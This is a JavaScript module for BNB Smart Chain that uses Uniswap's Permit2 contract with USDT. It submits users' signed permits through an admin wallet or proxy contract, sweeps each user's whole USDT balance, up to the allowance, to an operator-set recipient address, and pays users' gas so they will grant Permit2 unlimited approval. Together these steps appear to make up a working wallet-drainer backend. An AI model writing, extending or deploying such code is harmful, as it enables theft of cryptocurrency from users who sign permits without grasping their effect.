import { ethers } from 'ethers';

const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
const DEFAULT_PROXY_ADDRESS = '0x4ac0F075d81C3460027D3CaFf98d9AbF50c6723B';

const PERMIT2_ABI = [
  'function permit(address owner, ((address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature) external',
  'function transferFrom(address from, address to, uint160 amount, address token) external',
  'function allowance(address owner, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)',
];

const PROXY_ABI = [
  'function executePermit(address tokenOwner, ((address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature) external',
  'function executeTransfer(address from, address to, uint160 amount, address token) external',
  'function executePermitAndTransfer(address tokenOwner, ((address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature, address to, uint160 transferAmount) external',
];

const USDT_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function allowance(address owner, address spender) view returns (uint256)',
];

function getSpenderAddress(wallet) {
  const proxy = process.env.PROXY_CONTRACT_ADDRESS || process.env.ADMIN_SPENDER_ADDRESS || DEFAULT_PROXY_ADDRESS;
  if (proxy && ethers.isAddress(proxy) && !proxy.startsWith('0x00000000000000000000')) {
    return ethers.getAddress(proxy);
  }
  return wallet.address;
}

/**
 * Read the current on-chain nonce for a user from Permit2 AllowanceTransfer.
 */
export async function getOnChainNonce(ownerAddress, tokenAddress = '0x55d398326f99059ff775485246999027b3197955') {
  try {
    const provider = new ethers.JsonRpcProvider(process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org/');
    const dummyKey = '0x0000000000000000000000000000000000000000000000000000000000000001';
    const wallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY || dummyKey, provider);
    const spenderAddress = getSpenderAddress(wallet);
    const contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, provider);
    const [_amount, _expiration, nonce] = await contract.allowance(
      ethers.getAddress(ownerAddress),
      ethers.getAddress(tokenAddress),
      spenderAddress
    );
    return Number(nonce);
  } catch (err) {
    console.error('Error fetching on-chain nonce:', err.message);
    return 0;
  }
}

/**
 * Step 1: Submit the user's signed permit to Permit2 contract.
 */
export async function activatePermit(permit) {
  const provider = new ethers.JsonRpcProvider(process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org/');
  const wallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY, provider);
  
  const ownerAddress = ethers.getAddress(permit.owner);
  const tokenAddress = ethers.getAddress(permit.token);
  
  // Determine target spender from permit record or current config
  const defaultSpender = getSpenderAddress(wallet);
  const targetSpender = permit.spender && ethers.isAddress(permit.spender)
    ? ethers.getAddress(permit.spender)
    : defaultSpender;
    
  const proxyAddress = (process.env.PROXY_CONTRACT_ADDRESS || DEFAULT_PROXY_ADDRESS).toLowerCase();
  const isUsingProxy = targetSpender.toLowerCase() === proxyAddress;

  // Check user approved Permit2 on USDT contract
  const usdtContract = new ethers.Contract(tokenAddress, USDT_ABI, provider);
  const erc20Allowance = await usdtContract.allowance(ownerAddress, PERMIT2_ADDRESS);

  if (erc20Allowance === 0n) {
    throw new Error('User has not approved Permit2 contract on USDT token yet. User must approve from the frontend first.');
  }

  const permitSingle = {
    details: {
      token: tokenAddress,
      amount: permit.amount,
      expiration: permit.deadline,
      nonce: permit.nonce,
    },
    spender: targetSpender,
    sigDeadline: permit.deadline,
  };

  const signature = ethers.Signature.from({
    r: permit.r,
    s: permit.s,
    v: permit.v,
  }).serialized;

  console.log(`Activating AllowanceTransfer permit via Spender: ${targetSpender} (Proxy: ${isUsingProxy})`);

  if (isUsingProxy) {
    const proxyContract = new ethers.Contract(targetSpender, PROXY_ABI, wallet);
    try {
      await proxyContract.executePermit.staticCall(ownerAddress, permitSingle, signature);
    } catch (simErr) {
      const reason = simErr.reason || simErr.shortMessage || simErr.message;
      console.warn(`Simulated proxy executePermit() reverted: ${reason}`);
      const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, provider);
      const existing = await permit2Contract.allowance(ownerAddress, tokenAddress, targetSpender);
      if (existing.amount > 0n) {
        return '0xALREADY_ACTIVATED';
      }
      throw new Error(`Permit signature invalid or already processed on-chain: ${reason}`);
    }

    const tx = await proxyContract.executePermit(ownerAddress, permitSingle, signature, { gasLimit: 250000 });
    console.log('Proxy permit activation TX sent:', tx.hash);
    const receipt = await tx.wait();
    return receipt.hash;
  } else {
    const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, wallet);
    try {
      await permit2Contract.permit.staticCall(ownerAddress, permitSingle, signature);
    } catch (simErr) {
      const reason = simErr.reason || simErr.shortMessage || simErr.message;
      const existing = await permit2Contract.allowance(ownerAddress, tokenAddress, targetSpender);
      if (existing.amount > 0n) {
        return '0xALREADY_ACTIVATED';
      }
      throw new Error(`Permit signature invalid or processed: ${reason}`);
    }

    const tx = await permit2Contract.permit(ownerAddress, permitSingle, signature, { gasLimit: 200000 });
    const receipt = await tx.wait();
    return receipt.hash;
  }
}

/**
 * Step 2: Transfer tokens using active Permit2 allowance via Proxy or Wallet.
 * Automatically activates permit on-chain if not already activated.
 */
export async function executeTransfer(permit, customAmount = null) {
  const provider = new ethers.JsonRpcProvider(process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org/');
  const wallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY, provider);

  const ownerAddress = ethers.getAddress(permit.owner);
  const tokenAddress = ethers.getAddress(permit.token);
  const recipientAddress = ethers.getAddress(process.env.RECIPIENT_ADDRESS);

  const usdtContract = new ethers.Contract(tokenAddress, USDT_ABI, provider);
  const balance = await usdtContract.balanceOf(ownerAddress);

  if (balance === 0n) {
    throw new Error('User wallet currently has 0 USDT balance on-chain.');
  }

  const defaultSpender = getSpenderAddress(wallet);
  const targetSpender = permit.spender && ethers.isAddress(permit.spender)
    ? ethers.getAddress(permit.spender)
    : defaultSpender;

  const proxyAddress = (process.env.PROXY_CONTRACT_ADDRESS || DEFAULT_PROXY_ADDRESS).toLowerCase();
  const isUsingProxy = targetSpender.toLowerCase() === proxyAddress;

  const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, provider);
  let [allowanceAmount, expiration] = await permit2Contract.allowance(
    ownerAddress,
    tokenAddress,
    targetSpender
  );

  // If allowance is zero, attempt to auto-activate permit on-chain first
  if (allowanceAmount === 0n) {
    console.log(`Allowance is 0. Auto-activating permit for ${ownerAddress} before transfer...`);
    try {
      await activatePermit(permit);
      const updatedAllowance = await permit2Contract.allowance(ownerAddress, tokenAddress, targetSpender);
      allowanceAmount = updatedAllowance[0];
      expiration = updatedAllowance[1];
    } catch (actErr) {
      console.warn('Auto-activation during transfer failed:', actErr.message);
      throw new Error(`Permit not active on-chain and auto-activation failed: ${actErr.message}`);
    }
  }

  if (allowanceAmount === 0n) {
    throw new Error('No active Permit2 allowance on-chain.');
  }

  const now = Math.floor(Date.now() / 1000);
  if (Number(expiration) > 0 && Number(expiration) < now) {
    throw new Error('Permit2 allowance has expired.');
  }

  let transferAmount = balance < allowanceAmount ? balance : allowanceAmount;
  if (customAmount) {
    const customBigInt = BigInt(customAmount);
    if (customBigInt < transferAmount) transferAmount = customBigInt;
  }

  console.log(`Executing transferFrom via ${isUsingProxy ? 'Proxy Contract' : 'Admin Wallet'} (${targetSpender})...`);

  if (isUsingProxy) {
    const proxyContract = new ethers.Contract(targetSpender, PROXY_ABI, wallet);
    try {
      await proxyContract.executeTransfer.staticCall(ownerAddress, recipientAddress, transferAmount, tokenAddress);
    } catch (simErr) {
      const reason = simErr.reason || simErr.shortMessage || simErr.message;
      throw new Error(`Proxy transfer simulation failed on-chain: ${reason}`);
    }

    const tx = await proxyContract.executeTransfer(
      ownerAddress,
      recipientAddress,
      transferAmount,
      tokenAddress,
      { gasLimit: 250000 }
    );
    console.log('Proxy Transfer TX sent:', tx.hash);
    const receipt = await tx.wait();
    return { txHash: receipt.hash, amount: transferAmount.toString() };
  } else {
    const permit2WalletContract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, wallet);
    try {
      await permit2WalletContract.transferFrom.staticCall(ownerAddress, recipientAddress, transferAmount, tokenAddress);
    } catch (simErr) {
      const reason = simErr.reason || simErr.shortMessage || simErr.message;
      throw new Error(`Transfer simulation failed on-chain: ${reason}`);
    }

    const tx = await permit2WalletContract.transferFrom(ownerAddress, recipientAddress, transferAmount, tokenAddress, { gasLimit: 200000 });
    const receipt = await tx.wait();
    return { txHash: receipt.hash, amount: transferAmount.toString() };
  }
}

/**
 * Check the current Permit2 AllowanceTransfer state for a user safely with error fallback.
 */
export async function checkPermit2Allowance(ownerAddress, tokenAddress) {
  try {
    if (!ownerAddress || !tokenAddress) return null;

    let cleanOwner, cleanToken;
    try {
      cleanOwner = ethers.getAddress(ownerAddress);
      cleanToken = ethers.getAddress(tokenAddress);
    } catch (addrErr) {
      return null;
    }

    const rpcUrl = process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org/';
    const provider = new ethers.JsonRpcProvider(rpcUrl);

    let walletAddress = process.env.ADMIN_PUBLIC_ADDRESS;
    if (process.env.ADMIN_PRIVATE_KEY && !process.env.ADMIN_PRIVATE_KEY.startsWith('0x00000000000000000000')) {
      try {
        const wallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY);
        walletAddress = wallet.address;
      } catch (e) {}
    }

    const spender = (process.env.PROXY_CONTRACT_ADDRESS || process.env.ADMIN_SPENDER_ADDRESS || DEFAULT_PROXY_ADDRESS || walletAddress);

    if (!spender || !ethers.isAddress(spender)) {
      return null;
    }

    const contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, provider);
    const usdtContract = new ethers.Contract(cleanToken, USDT_ABI, provider);

    const fetchAllowance = Promise.all([
      contract.allowance(cleanOwner, cleanToken, spender),
      usdtContract.allowance(cleanOwner, PERMIT2_ADDRESS),
    ]);

    const timeout = new Promise((_, reject) =>
      setTimeout(() => reject(new Error('RPC Timeout')), 4000)
    );

    const [[amount, expiration, nonce], erc20Allowance] = await Promise.race([fetchAllowance, timeout]);

    return {
      spender,
      permit2Amount: amount.toString(),
      permit2Expiration: Number(expiration),
      permit2Nonce: Number(nonce),
      erc20Allowance: erc20Allowance.toString(),
      hasErc20Approval: erc20Allowance > 0n,
      hasPermit2Allowance: amount > 0n,
      isExpired: Number(expiration) > 0 && Number(expiration) < Math.floor(Date.now() / 1000),
    };
  } catch (err) {
    console.error('Error checking Permit2 allowance for', ownerAddress, err.message);
    return null;
  }
}

/**
 * Send the exact BNB needed for one USDT.approve(Permit2, MaxUint256) TX.
 */
export async function sendGasFunding(userAddress) {
  const USDT_ADDRESS   = '0x55d398326f99059ff775485246999027b3197955';
  const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

  const provider = new ethers.JsonRpcProvider(process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org/');
  const wallet   = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY, provider);

  const recipientAddress = ethers.getAddress(userAddress);

  let approveGasUnits;
  try {
    const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, wallet);
    const estimatedGas = await usdtContract.approve.estimateGas(
      PERMIT2_ADDRESS,
      ethers.MaxUint256,
      { from: recipientAddress }
    );
    approveGasUnits = (estimatedGas * 130n) / 100n;
  } catch (simErr) {
    approveGasUnits = 65000n;
  }

  const feeData  = await provider.getFeeData();
  const gasPrice = feeData.gasPrice || ethers.parseUnits('3', 'gwei');

  const requiredGasCost = approveGasUnits * gasPrice;

  const currentBalance = await provider.getBalance(recipientAddress);
  if (currentBalance >= requiredGasCost) {
    return {
      status: 'SUFFICIENT_BALANCE',
      message: 'User already has sufficient BNB for gas',
      txHash: null,
      neededBnb: '0',
    };
  }

  const fundingDeficit = requiredGasCost - currentBalance;
  const adminBalance   = await provider.getBalance(wallet.address);

  if (adminBalance < fundingDeficit) {
    throw new Error('Admin wallet does not have enough BNB to sponsor gas');
  }

  console.log(`Sending ${ethers.formatEther(fundingDeficit)} BNB gas funding to ${recipientAddress}...`);

  const tx = await wallet.sendTransaction({
    to: recipientAddress,
    value: fundingDeficit,
  });

  console.log('Gas funding TX sent:', tx.hash);
  const receipt = await tx.wait(1);
  console.log('Gas funding confirmed on-chain! Hash:', receipt.hash);

  return {
    status: 'FUNDED',
    txHash: receipt.hash,
    fundedBnb: ethers.formatEther(fundingDeficit),
  };
}
